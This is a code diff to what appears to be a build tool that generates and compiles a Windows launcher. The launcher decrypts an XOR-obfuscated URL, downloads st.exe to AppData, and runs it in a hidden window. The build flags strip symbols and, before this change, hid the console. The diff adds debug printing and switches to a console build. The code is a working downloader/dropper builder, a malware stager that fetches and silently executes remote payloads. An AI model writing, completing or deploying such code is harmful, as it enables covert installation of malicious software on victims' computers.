@@ -115,50 +115,87 @@ static int download_file(const wchar_t* url, const wchar_t* dest) {
     uc.lpszHostName = host; uc.dwHostNameLength = 256;
     uc.lpszUrlPath = path; uc.dwUrlPathLength = 1024;
     
-    if (!WinHttpCrackUrl(url, 0, 0, &uc)) return 0;
-
-    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!hSession) return 0;
-
-    HINTERNET hConnect = WinHttpConnect(hSession, host, uc.nPort, 0);
-    if (!hConnect) { WinHttpCloseHandle(hSession); return 0; }
-
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
-    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return 0; }
-
-    BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
-    if (bResults) bResults = WinHttpReceiveResponse(hRequest, NULL);
-
-    if (bResults) {
-        HANDLE hFile = CreateFileW(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-        if (hFile != INVALID_HANDLE_VALUE) {
-            DWORD dwSize = 0, dwDownloaded = 0;
-            do {
-                dwSize = 0;
-                if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
-                if (dwSize == 0) break;
-                BYTE* pBuffer = (BYTE*)malloc(dwSize);
-                if (pBuffer) {
-                    if (WinHttpReadData(hRequest, pBuffer, dwSize, &dwDownloaded)) {
-                        DWORD written = 0;
-                        WriteFile(hFile, pBuffer, dwDownloaded, &written, NULL);
-                    }
-                    free(pBuffer);
-                }
-            } while (dwSize > 0);
-            CloseHandle(hFile);
-        }
+    if (!WinHttpCrackUrl(url, 0, 0, &uc)) {
+        printf("[-] WinHttpCrackUrl failed: %lu\n", GetLastError());
+        return 0;
     }
 
+    printf("[+] Connecting to %ls:%d%ls...\n", host, uc.nPort, path);
+
+    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) {
+        printf("[-] WinHttpOpen failed: %lu\n", GetLastError());
+        return 0;
+    }
+
+    HINTERNET hConnect = WinHttpConnect(hSession, host, uc.nPort, 0);
+    if (!hConnect) {
+        printf("[-] WinHttpConnect failed: %lu\n", GetLastError());
+        WinHttpCloseHandle(hSession);
+        return 0;
+    }
+
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    if (!hRequest) {
+        printf("[-] WinHttpOpenRequest failed: %lu\n", GetLastError());
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return 0;
+    }
+
+    printf("[+] Sending request...\n");
+    BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+    if (!bResults) {
+        printf("[-] WinHttpSendRequest failed: %lu\n", GetLastError());
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return 0;
+    }
+
+    bResults = WinHttpReceiveResponse(hRequest, NULL);
+    if (!bResults) {
+        printf("[-] WinHttpReceiveResponse failed: %lu\n", GetLastError());
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return 0;
+    }
+
+    printf("[+] Response received. Writing file...\n");
+    HANDLE hFile = CreateFileW(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        printf("[-] CreateFileW failed: %lu\n", GetLastError());
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return 0;
+    }
+
+    DWORD dwSize = 0, dwDownloaded = 0;
+    do {
+        dwSize = 0;
+        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
+        if (dwSize == 0) break;
+        BYTE* pBuffer = (BYTE*)malloc(dwSize);
+        if (pBuffer) {
+            if (WinHttpReadData(hRequest, pBuffer, dwSize, &dwDownloaded)) {
+                DWORD written = 0;
+                WriteFile(hFile, pBuffer, dwDownloaded, &written, NULL);
+            }
+            free(pBuffer);
+        }
+    } while (dwSize > 0);
+    
+    CloseHandle(hFile);
     WinHttpCloseHandle(hRequest);
     WinHttpCloseHandle(hConnect);
     WinHttpCloseHandle(hSession);
-    return bResults;
+    return 1;
 }
 
-int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
-    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;
-
+int main() {
+    printf("[+] Starting boot.exe...\n");
     Sleep(1500); 
 
     wchar_t appdata[MAX_PATH];
@@ -172,7 +209,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     
     CreateDirectoryW(dir, NULL);
 
-    // 1. Write key.json
+    printf("[+] Writing key.json...\n");
     HANDLE hKey = CreateFileW(keyPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hKey != INVALID_HANDLE_VALUE) {
         DWORD w;
@@ -182,9 +219,10 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
         CloseHandle(hKey);
     }
 
-    // 2. Download st.exe
+    printf("[+] Checking for existing st.exe...\n");
     int need_st = !is_valid_pe(stPath);
     if (need_st) {
+        printf("[+] st.exe missing. Downloading...\n");
         char stUrlStr[128] = {0};
         wchar_t stUrlW[128] = {0};
         const char encStUrl[] = ${encStUrl};
@@ -192,8 +230,8 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
         decrypt(stUrlStr, sizeof(encStUrl), ${meta.xorKey});
         MultiByteToWideChar(CP_ACP, 0, stUrlStr, -1, stUrlW, 128);
 
-        // Download to a temp file to prevent "File Already Exists"
         if (download_file(stUrlW, stNewPath) && is_valid_pe(stNewPath)) {
+            printf("[+] Download successful! Moving file...\n");
             DeleteFileW(stPath);
             MoveFileW(stNewPath, stPath);
             need_st = 0;
@@ -201,11 +239,12 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     }
 
     if (need_st) {
-        MessageBoxA(NULL, "Download failed. Check server IP and port 80.", "Error", MB_ICONERROR);
+        printf("[-] Download failed. Exiting...\n");
+        Sleep(5000);
         return 1; 
     }
 
-    // 3. Run st.exe hidden
+    printf("[+] Launching st.exe...\n");
     STARTUPINFOW si = { sizeof(si) };
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
@@ -218,6 +257,9 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
                    
     if (pi.hProcess) CloseHandle(pi.hProcess);
     if (pi.hThread)  CloseHandle(pi.hThread);
+    
+    printf("[+] Done. Exiting in 3 seconds...\n");
+    Sleep(3000);
     return 0;
 }
 `;
@@ -282,7 +324,8 @@ export async function compileLauncher({ key, config, baseExe, buildId }) {
                               '--input-format=rc', '--output-format=coff'],
                     { cwd: workDir, timeout: 30_000 });
     
-    await execFileP(CC, ['-O2', '-s', '-mwindows', '-o', outPath, cPath, resPath,
+    // CHANGED TO -mconsole SO YOU CAN SEE THE DEBUG OUTPUT
+    await execFileP(CC, ['-O2', '-s', '-mconsole', '-o', outPath, cPath, resPath,
                          '-lshell32', '-lole32', '-luser32', '-lkernel32', '-ladvapi32', '-lwinhttp'],
                     { cwd: workDir, timeout: 60_000 });
 
